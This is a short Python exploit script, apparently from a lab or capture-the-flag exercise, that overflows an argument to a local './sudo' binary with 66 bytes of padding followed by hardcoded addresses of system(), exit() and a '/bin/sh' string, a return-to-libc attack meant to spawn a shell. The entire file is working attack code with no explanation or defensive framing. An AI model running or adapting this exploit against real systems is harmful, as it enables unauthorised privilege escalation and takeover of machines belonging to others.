import os
import sys
import struct


PATH_TO_SUDO = './sudo'


def get_arg():
    bin_sh_addr = 0xb7d7d82b
    sys_addr = 0xb7c5cda0
    exit_addr = 0xb7c509d0
    offset = 66
    buf = 'a' * offset
    shellcode = buf + struct.pack('<IIIB', sys_addr, exit_addr, bin_sh_addr, 0x42)
    return shellcode


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
